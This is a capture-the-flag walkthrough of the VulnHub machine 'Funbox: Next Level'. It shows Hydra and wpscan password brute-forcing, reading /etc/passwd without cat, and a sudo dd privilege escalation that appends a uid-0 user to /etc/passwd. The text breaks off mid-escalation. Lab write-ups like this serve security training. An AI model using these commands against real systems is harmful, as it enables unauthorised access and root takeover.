## Introduction
*Lets separate the script-kids from script-teenies.  
Hint: The first impression is not always the right one!*

No updates for a few days; I was away for work for a bit and I've been partway through a few things - but now I've completed [Funbox: Next Level](https://www.vulnhub.com/entry/funbox-next-level,547/). Here's how.

## Ports
Not much to say here, we've just got SSH on 22 and HTTP on Port 80. Nmap says Port 80 is Apache; presumably that's where we are looking.

## Drupal; but not really
So gobuster quickly tells us that we've got a *drupal* directory, so that seems like a good place to look. Except when we try to look inside of that 
directory:

``
root@kali:/opt/vulnhub/nextlevel# gobuster dir -u http://192.168.1.92/drupal -w /usr/share/dirb/wordlists/common.txt
``

gobuster gets sad and says:
>(Client.Timeout exceeded while awaiting headers)

Hmm, what's going on? If we visit http://192.168.1.92/drupal in Firefox, we get a message that it is waiting for 192.168.178.33. This is not an IP on my network, so is unreachable - and no wonder gobuster times out. So what is happening? Somehow the server is trying to do a redirect to an IP address that doesn't exist - what do we do?

Fortunately, WFUZZ doesn't care about that:

``
root@kali:/opt/vulnhub/nextlevel# wfuzz -c --hh 274  -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt http://192.168.1.92/drupal/FUZZ.php
``

This brings up a couple of interesting things, including *wp-login*. So are we actually running wordpress? Spoiler alert: yes.

## Wordpress
Normally I'd run wpscan on a wordpress site and frankly this was no exception. But how do we deal with the redirect? There is a switch we can use to ignore it:

``
--ignore-main-redirect
``

Running *wpscan -e* turns up two users; **ben** and **admin**. Also xmlrpc is enabled, so we can try a password attack:

``
root@kali:/opt/vulnhub/nextlevel# wpscan --url http://192.168.1.92/drupal --ignore-main-redirect --force -U 'ben,admin' -P /usr/share/seclists/Passwords/probable-v2-top12000.txt
``

However, it doesn't work. Now what?

## et tu, Bruteforce?
Well, we know one of our usernames, so let's see what Hydra thinks:

{% highlight shell %}
root@kali:/opt/vulnhub/nextlevel# hydra -l ben -P /usr/share/wordlists/rockyou.txt 192.168.1.92 ssh

{% endhighlight %}

Boom, we're in. We can *ssh* in as *ben*.

## On the box
On the box, life is still a little difficult. We've got no **head**, **tail** or **cat**. Maybe others too, but that's what I tried and they all didn't work. Which made *linpeas* sad too. Is there a way to get around not being able to read files? Sure:

``
ben@funbox5:/$ python3 -c 'import sys; sys.stdout.write(sys.stdin.read())' < /etc/passwd
``

So that's useful. With it, we can read Ben's mail:

{% highlight shell %}

Hi Ben,

please come to my office at 10:00 a.m. We have a lot to talk about!
The new employees must be created. Ive already finished Adam.
CREDS FOR ADAM WERE HERE
{% endhighlight %}

So now we can *su* as Adam.

## Adam
What can Adam do? Adam can use **dd** as root. Also **de** and **df**, whatever they are. Actually de doesn't exist, and I didn't worry about df.

{% highlight shell %}
adam@funbox5:~$ sudo -l
[sudo] password for adam: 
Matching Defaults entries for adam on funbox5:
    env_reset

User adam may run the following commands on funbox5:
    (root) PASSWD: /bin/dd
    (root) PASSWD: /bin/de
    (root) PASSWD: /bin/df
{% endhighlight %}

## Privesc
What can we do with **dd**? [GTFOBins](https://gtfobins.github.io/gtfobins/dd/#sudo) says we can read and write privileged files. So how about we try writing to */etc/passwd*? We essentially want to append a new line. I'll do that by using **dd** to do a read of */etc/passwd* into a temporary file, I'll append a new line to that, and then I'll overwrite the real */etc/passwd* with my copy. Sounds good? Let's see:

{% highlight shell %}
adam@funbox5:/tmp$ sudo -u root /bin/dd if=/etc/passwd > temp
adam@funbox5:/tmp$ python3 -c 'import sys; sys.stdout.write(sys.stdin.read())' < temp
-- SNIPPED - just made sure it worked okay --
adam@funbox5:/tmp$ openssl passwd mrcake

adam@funbox5:/tmp$ echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> temp
